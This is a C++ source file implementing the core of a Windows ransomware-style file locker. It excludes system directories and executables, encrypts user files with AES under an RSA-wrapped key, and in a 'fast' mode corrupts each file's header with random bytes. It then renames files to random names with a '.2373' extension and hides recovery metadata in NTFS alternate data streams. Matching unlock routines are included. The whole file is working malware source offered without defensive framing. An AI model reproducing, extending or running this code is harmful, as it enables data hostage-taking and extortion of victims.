#include "file_service.h"
#include "crypto_service.h"
#include <algorithm>
#include <cstring>
#include <fstream>
#include <iostream>
#include <random>

const std::string MAGIC_SIGNATURE = "LOCK2373";
const std::string ENCRYPTED_EXTENSION = ".2373";

bool FileService::IsPathExcluded(const fs::path &path) {
  if (!g_selfExePath.empty()) {
    std::string pathStrNormalized = path.string();
    std::string selfStrNormalized = g_selfExePath.string();
    std::transform(pathStrNormalized.begin(), pathStrNormalized.end(),
                   pathStrNormalized.begin(), ::tolower);
    std::transform(selfStrNormalized.begin(), selfStrNormalized.end(),
                   selfStrNormalized.begin(), ::tolower);
    if (pathStrNormalized == selfStrNormalized) {
      return true;
    }
  }

  std::string pathStr = path.string();
  std::transform(pathStr.begin(), pathStr.end(), pathStr.begin(), ::tolower);

  static const std::vector<std::string> forbiddenDirs = {
      "\\windows\\",
      "\\program files\\",
      "\\program files (x86)\\",
      "\\programdata\\",
      "\\appdata\\",
      "\\$recycle.bin\\",
      "\\system volume information\\",
      "\\boot\\",
      "\\recovery\\",
      "\\msocache\\",
      "\\documents and settings\\"};

  for (const auto &dir : forbiddenDirs) {
    if (pathStr.find(dir) != std::string::npos) {
      return true;
    }
  }

  std::string ext = path.extension().string();
  std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
  static const std::vector<std::string> forbiddenExts = {
      ".exe", ".dll", ".sys", ".ini",  ".lnk", ".msi",  ".bat",
      ".cmd", ".vbs", ".reg", ".2373", ".pub", ".priv", ".key"};

  for (const auto &forbiddenExt : forbiddenExts) {
    if (ext == forbiddenExt) {
      return true;
    }
  }

  return false;
}

std::string FileService::GenerateRandomName() {
  static const char alphanum[] = "abcdefghijklmnopqrstuvwxyz0123456789";
  std::string s;
  std::vector<BYTE> randomBytes = CryptoService::GenerateRandomBytes(12);
  for (int i = 0; i < 12; ++i) {
    s += alphanum[randomBytes[i] % (sizeof(alphanum) - 1)];
  }
  return s;
}

bool FileService::LockFile(const fs::path &filePath,
                           const std::string &rsaPubKeyB64,
                           const std::string &password, bool fullMode) {
  if (IsPathExcluded(filePath)) {
    return false;
  }

  try {
    uint64_t originalSize = fs::file_size(filePath);

    // Keys derivation
    std::vector<BYTE> aesKey;
    if (!password.empty()) {
      aesKey = CryptoService::DeriveKeyFromPassword(password);
    } else {
      aesKey = CryptoService::GenerateRandomBytes(32);
    }
    std::vector<BYTE> iv = CryptoService::GenerateRandomBytes(16);

    std::vector<BYTE> verifyData = aesKey;
    std::string verifySalt = "verify";
    verifyData.insert(verifyData.end(), verifySalt.begin(), verifySalt.end());
    std::vector<BYTE> verifyHash = CryptoService::Sha256(verifyData);

    // Determine chunk size based on file extension
    std::string ext = filePath.extension().string();
    std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

    static const std::vector<std::string> textExtensions = {
        ".txt", ".json", ".csv", ".xml", ".ini",  ".cfg", ".log",
        ".cpp", ".h",    ".c",   ".py",  ".java", ".cs",  ".js",
        ".ts",  ".html", ".css", ".md",  ".sh",   ".bat", ".cmd"};

    size_t maxChunkSize = 1024; // Default: 1KB
    if (std::find(textExtensions.begin(), textExtensions.end(), ext) !=
        textExtensions.end()) {
      maxChunkSize = 65536; // Text/Data files: 64KB
    }

    if (!fullMode) {
      // ==========================================
      // ULTRA-FAST MODE (ADS): In-place Overwrite + ADS Header
      // ==========================================
      auto tStart = std::chrono::high_resolution_clock::now();
      size_t chunkSize =
          (originalSize < maxChunkSize) ? (size_t)originalSize : maxChunkSize;

      HANDLE hFile =
          CreateFileW(filePath.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL,
                      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
      if (hFile == INVALID_HANDLE_VALUE)
        return false;

      std::vector<BYTE> chunkData(chunkSize);
      DWORD bytesRead = 0;
      if (chunkSize > 0) {
        ReadFile(hFile, chunkData.data(), (DWORD)chunkSize, &bytesRead, NULL);
      }
      auto tRead = std::chrono::high_resolution_clock::now();

      // Encrypt metadata + original chunk
      std::vector<BYTE> metaBuffer;
      metaBuffer.insert(metaBuffer.end(), (BYTE *)&originalSize,
                        (BYTE *)&originalSize + 8);
      std::string filename = filePath.filename().string();
      uint32_t filenameLen = filename.length();
      metaBuffer.insert(metaBuffer.end(), (BYTE *)&filenameLen,
                        (BYTE *)&filenameLen + 4);
      metaBuffer.insert(metaBuffer.end(), filename.begin(), filename.end());
      uint32_t chunkSizeVal = (uint32_t)chunkSize;
      metaBuffer.insert(metaBuffer.end(), (BYTE *)&chunkSizeVal,
                        (BYTE *)&chunkSizeVal + 4);
      if (chunkSize > 0) {
        metaBuffer.insert(metaBuffer.end(), chunkData.begin(), chunkData.end());
      }

      std::vector<BYTE> encryptedMeta =
          CryptoService::AesEncrypt(aesKey, iv, metaBuffer);
      if (encryptedMeta.empty()) {
        CloseHandle(hFile);
        return false;
      }

      UnencryptedHeader header = {};
      memcpy(header.magic, MAGIC_SIGNATURE.c_str(), 8);
      header.version = 1;
      header.mode = 0; // Fast Mode
      header.auth_type = !password.empty() ? 2 : 1;
      memcpy(header.iv, iv.data(), 16);
      memcpy(header.verification_hash, verifyHash.data(), 32);
      header.encrypted_meta_len = (uint32_t)encryptedMeta.size();

      if (header.auth_type == 1) {
        std::vector<BYTE> encKeyBlob =
            CryptoService::RsaEncrypt(rsaPubKeyB64, aesKey);
        if (encKeyBlob.size() != 256) {
          CloseHandle(hFile);
          return false;
        }
        header.encrypted_key_len = 256;
        memcpy(header.encrypted_key, encKeyBlob.data(), 256);
      } else {
        header.encrypted_key_len = 0;
      }
      auto tCrypt = std::chrono::high_resolution_clock::now();

      // 1. Overwrite first chunk with random bytes (corrupts file header
      // instantly)
      std::vector<BYTE> randomGarbage =
          CryptoService::GenerateRandomBytes(chunkSize);
      SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
      DWORD bytesWritten = 0;
      if (chunkSize > 0) {
        WriteFile(hFile, randomGarbage.data(), (DWORD)chunkSize, &bytesWritten,
                  NULL);
      }
      CloseHandle(hFile);
      auto tOverwrite = std::chrono::high_resolution_clock::now();

      // 2. Rename file to random obfuscated name
      fs::path outPath =
          filePath.parent_path() / (GenerateRandomName() + ENCRYPTED_EXTENSION);
      fs::rename(filePath, outPath);
      auto tRename = std::chrono::high_resolution_clock::now();

      // 3. Write header and metadata block to NTFS Alternate Data Stream (ADS)
      std::wstring adsPath = outPath.wstring() + L":2373";
      HANDLE hAdsFile = CreateFileW(adsPath.c_str(), GENERIC_WRITE, 0, NULL,
                                    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
      if (hAdsFile == INVALID_HANDLE_VALUE) {
        // Rollback rename if ADS fails
        fs::rename(outPath, filePath);
        return false;
      }
      WriteFile(hAdsFile, &header, sizeof(header), &bytesWritten, NULL);
      WriteFile(hAdsFile, encryptedMeta.data(), (DWORD)encryptedMeta.size(),
                &bytesWritten, NULL);
      CloseHandle(hAdsFile);
      auto tAds = std::chrono::high_resolution_clock::now();

      std::cout
          << "[Timing] Read: "
          << std::chrono::duration<double, std::milli>(tRead - tStart).count()
          << " ms | "
          << "Crypt: "
          << std::chrono::duration<double, std::milli>(tCrypt - tRead).count()
          << " ms | "
          << "Overwrite: "
          << std::chrono::duration<double, std::milli>(tOverwrite - tCrypt)
                 .count()
          << " ms | "
          << "Rename: "
          << std::chrono::duration<double, std::milli>(tRename - tOverwrite)
                 .count()
          << " ms | "
          << "ADS: "
          << std::chrono::duration<double, std::milli>(tAds - tRename).count()
          << " ms\n";

      std::cout << "[+] Locked (FAST): " << filePath.filename().string()
                << " -> " << outPath.filename().string() << std::endl;
      return true;
    } else {
      // ==========================================
      // FULL MODE: Encrypt Entire File
      // ==========================================
      std::ifstream inFile(filePath, std::ios::binary);
      if (!inFile)
        return false;

      size_t chunkSize =
          (originalSize < maxChunkSize) ? (size_t)originalSize : maxChunkSize;
      std::vector<BYTE> chunkData(chunkSize);
      if (chunkSize > 0) {
        inFile.read((char *)chunkData.data(), chunkSize);
      }

      std::vector<BYTE> metaBuffer;
      metaBuffer.insert(metaBuffer.end(), (BYTE *)&originalSize,
                        (BYTE *)&originalSize + 8);
      std::string filename = filePath.filename().string();
      uint32_t filenameLen = filename.length();
      metaBuffer.insert(metaBuffer.end(), (BYTE *)&filenameLen,
                        (BYTE *)&filenameLen + 4);
      metaBuffer.insert(metaBuffer.end(), filename.begin(), filename.end());
      uint32_t chunkSizeVal = (uint32_t)chunkSize;
      metaBuffer.insert(metaBuffer.end(), (BYTE *)&chunkSizeVal,
                        (BYTE *)&chunkSizeVal + 4);
      if (chunkSize > 0) {
        metaBuffer.insert(metaBuffer.end(), chunkData.begin(), chunkData.end());
      }

      std::vector<BYTE> encryptedMeta =
          CryptoService::AesEncrypt(aesKey, iv, metaBuffer);
      if (encryptedMeta.empty())
        return false;

      UnencryptedHeader header = {};
      memcpy(header.magic, MAGIC_SIGNATURE.c_str(), 8);
      header.version = 1;
      header.mode = 1; // Full Mode
      header.auth_type = !password.empty() ? 2 : 1;
      memcpy(header.iv, iv.data(), 16);
      memcpy(header.verification_hash, verifyHash.data(), 32);
      header.encrypted_meta_len = (uint32_t)encryptedMeta.size();

      if (header.auth_type == 1) {
        std::vector<BYTE> encKeyBlob =
            CryptoService::RsaEncrypt(rsaPubKeyB64, aesKey);
        if (encKeyBlob.size() != 256)
          return false;
        header.encrypted_key_len = 256;
        memcpy(header.encrypted_key, encKeyBlob.data(), 256);
      } else {
        header.encrypted_key_len = 0;
      }

      fs::path outPath =
          filePath.parent_path() / (GenerateRandomName() + ENCRYPTED_EXTENSION);
      std::ofstream outFile(outPath, std::ios::binary);
      if (!outFile)
        return false;

      outFile.write((char *)&header, sizeof(header));
      outFile.write((char *)encryptedMeta.data(), encryptedMeta.size());

      const size_t bufferSize = 64 * 1024;
      std::vector<BYTE> buffer(bufferSize);
      std::vector<BYTE> blockToEncrypt;

      inFile.seekg(chunkSize);
      while (inFile) {
        inFile.read((char *)buffer.data(), bufferSize);
        size_t readCount = inFile.gcount();
        if (readCount > 0) {
          blockToEncrypt.assign(buffer.begin(), buffer.begin() + readCount);
          std::vector<BYTE> encBlock =
              CryptoService::AesEncrypt(aesKey, iv, blockToEncrypt);
          uint32_t encBlockLen = encBlock.size();
          outFile.write((char *)&encBlockLen, 4);
          outFile.write((char *)encBlock.data(), encBlock.size());
        }
      }

      inFile.close();
      outFile.close();

      fs::remove(filePath);
      std::cout << "[+] Locked (FULL): " << filePath.filename().string()
                << " -> " << outPath.filename().string() << std::endl;
      return true;
    }
  } catch (...) {
    return false;
  }
}

bool FileService::UnlockFile(const fs::path &filePath,
                             const std::string &rsaPrivKeyB64,
                             const std::string &password) {
  if (filePath.extension() != ENCRYPTED_EXTENSION) {
    return false;
  }

  try {
    // Check if NTFS Alternate Data Stream exists by attempting to open it
    std::wstring adsPath = filePath.wstring() + L":2373";
    HANDLE hAdsFile = CreateFileW(adsPath.c_str(), GENERIC_READ, 0, NULL,
                                  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    bool isFastMode = (hAdsFile != INVALID_HANDLE_VALUE);

    UnencryptedHeader header = {};
    std::vector<BYTE> encryptedMeta;

    if (isFastMode) {
      // ==========================================
      // ULTRA-FAST DECRYPTION (ADS): Read ADS + Restore In-place + Delete ADS
      // ==========================================
      DWORD bytesRead = 0;
      ReadFile(hAdsFile, &header, sizeof(header), &bytesRead, NULL);

      if (std::string(header.magic, 8) != MAGIC_SIGNATURE) {
        CloseHandle(hAdsFile);
        return false;
      }

      encryptedMeta.resize(header.encrypted_meta_len);
      ReadFile(hAdsFile, encryptedMeta.data(), header.encrypted_meta_len,
               &bytesRead, NULL);
      CloseHandle(hAdsFile);

      std::vector<BYTE> aesKey;
      if (header.auth_type == 1) {
        if (rsaPrivKeyB64.empty())
          return false;
        std::vector<BYTE> encryptedKeyBytes(header.encrypted_key,
                                            header.encrypted_key + 256);
        aesKey = CryptoService::RsaDecrypt(rsaPrivKeyB64, encryptedKeyBytes);
        if (aesKey.empty())
          return false;
      } else if (header.auth_type == 2) {
        if (password.empty())
          return false;
        aesKey = CryptoService::DeriveKeyFromPassword(password);
      }

      std::vector<BYTE> verifyData = aesKey;
      std::string verifySalt = "verify";
      verifyData.insert(verifyData.end(), verifySalt.begin(), verifySalt.end());
      std::vector<BYTE> verifyHash = CryptoService::Sha256(verifyData);

      if (memcmp(verifyHash.data(), header.verification_hash, 32) != 0) {
        std::cerr
            << "[-] Authentication failed (incorrect key or password) for: "
            << filePath.filename().string() << std::endl;
        return false;
      }

      std::vector<BYTE> iv(header.iv, header.iv + 16);
      std::vector<BYTE> metaBuffer =
          CryptoService::AesDecrypt(aesKey, iv, encryptedMeta);
      if (metaBuffer.empty())
        return false;

      size_t offset = 0;
      uint64_t originalSize = *(uint64_t *)&metaBuffer[offset];
      offset += 8;
      uint32_t filenameLen = *(uint32_t *)&metaBuffer[offset];
      offset += 4;
      std::string originalName((char *)&metaBuffer[offset], filenameLen);
      offset += filenameLen;
      uint32_t chunkSize = *(uint32_t *)&metaBuffer[offset];
      offset += 4;
      std::vector<BYTE> chunkData;
      if (chunkSize > 0) {
        chunkData.assign(metaBuffer.begin() + offset,
                         metaBuffer.begin() + offset + chunkSize);
      }

      // 1. Overwrite first chunk in-place with decrypted chunk data
      HANDLE hFile =
          CreateFileW(filePath.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL,
                      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
      if (hFile == INVALID_HANDLE_VALUE)
        return false;
      SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
      DWORD bytesWritten = 0;
      if (chunkSize > 0) {
        WriteFile(hFile, chunkData.data(), (DWORD)chunkSize, &bytesWritten,
                  NULL);
      }
      CloseHandle(hFile);

      // 2. Delete NTFS Alternate Data Stream stream using Windows API
      // DeleteFileW
      DeleteFileW(adsPath.c_str());

      // 3. Rename to original filename
      fs::path outPath = filePath.parent_path() / originalName;
      fs::rename(filePath, outPath);

      std::cout << "[+] Unlocked (FAST): " << filePath.filename().string()
                << " -> " << originalName << std::endl;
      return true;
    } else {
      // ==========================================
      // FULL MODE DECRYPTION: Read sequentially to a new file
      // ==========================================
      std::ifstream file(filePath, std::ios::binary);
      if (!file)
        return false;

      file.read((char *)&header, sizeof(header));

      if (std::string(header.magic, 8) != MAGIC_SIGNATURE) {
        file.close();
        return false;
      }

      std::vector<BYTE> aesKey;
      if (header.auth_type == 1) {
        if (rsaPrivKeyB64.empty())
          return false;
        std::vector<BYTE> encryptedKeyBytes(header.encrypted_key,
                                            header.encrypted_key + 256);
        aesKey = CryptoService::RsaDecrypt(rsaPrivKeyB64, encryptedKeyBytes);
        if (aesKey.empty())
          return false;
      } else if (header.auth_type == 2) {
        if (password.empty())
          return false;
        aesKey = CryptoService::DeriveKeyFromPassword(password);
      } else {
        return false;
      }

      std::vector<BYTE> verifyData = aesKey;
      std::string verifySalt = "verify";
      verifyData.insert(verifyData.end(), verifySalt.begin(), verifySalt.end());
      std::vector<BYTE> verifyHash = CryptoService::Sha256(verifyData);

      if (memcmp(verifyHash.data(), header.verification_hash, 32) != 0) {
        std::cerr
            << "[-] Authentication failed (incorrect key or password) for: "
            << filePath.filename().string() << std::endl;
        return false;
      }

      encryptedMeta.resize(header.encrypted_meta_len);
      file.read((char *)encryptedMeta.data(), header.encrypted_meta_len);

      std::vector<BYTE> iv(header.iv, header.iv + 16);
      std::vector<BYTE> metaBuffer =
          CryptoService::AesDecrypt(aesKey, iv, encryptedMeta);
      if (metaBuffer.empty())
        return false;

      size_t offset = 0;
      uint64_t originalSize = *(uint64_t *)&metaBuffer[offset];
      offset += 8;
      uint32_t filenameLen = *(uint32_t *)&metaBuffer[offset];
      offset += 4;
      std::string originalName((char *)&metaBuffer[offset], filenameLen);
      offset += filenameLen;
      uint32_t chunkSize = *(uint32_t *)&metaBuffer[offset];
      offset += 4;
      std::vector<BYTE> chunkData;
      if (chunkSize > 0) {
        chunkData.assign(metaBuffer.begin() + offset,
                         metaBuffer.begin() + offset + chunkSize);
      }

      fs::path outPath = filePath.parent_path() / originalName;
      std::ofstream outFile(outPath, std::ios::binary);
      if (!outFile)
        return false;

      if (chunkSize > 0) {
        outFile.write((char *)chunkData.data(), chunkSize);
      }

      uint32_t encBlockLen = 0;
      while (file.read((char *)&encBlockLen, 4)) {
        std::vector<BYTE> encBlock(encBlockLen);
        file.read((char *)encBlock.data(), encBlockLen);
        std::vector<BYTE> decBlock =
            CryptoService::AesDecrypt(aesKey, iv, encBlock);
        outFile.write((char *)decBlock.data(), decBlock.size());
      }

      file.close();
      outFile.close();

      fs::remove(filePath);
      std::cout << "[+] Unlocked (FULL): " << filePath.filename().string()
                << " -> " << originalName << std::endl;
      return true;
    }
  } catch (...) {
    return false;
  }
}
